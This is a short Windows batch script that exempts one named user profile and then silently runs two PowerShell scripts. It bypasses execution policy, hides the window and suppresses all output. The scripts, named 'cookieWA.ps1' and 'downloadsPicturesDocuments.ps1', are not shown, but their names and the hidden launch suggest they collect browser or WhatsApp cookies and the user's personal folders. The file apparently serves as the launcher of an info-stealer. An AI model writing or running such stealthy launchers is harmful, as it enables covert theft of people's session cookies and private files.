@echo off
setlocal EnableDelayedExpansion

:: Block specific user
if "%userprofile%"=="C:\Users\amit" (
    echo daddy ka laptop hai mai kuch nhi kar sakta
    pause
    exit /b
)

:: Silently run external PowerShell script (if exists)
powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File "subParts/cookieWA.ps1" >nul 2>&1

:: Silently run external PowerShell script (if exists)
powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File "subParts/downloadsPicturesDocuments.ps1" >nul 2>&1
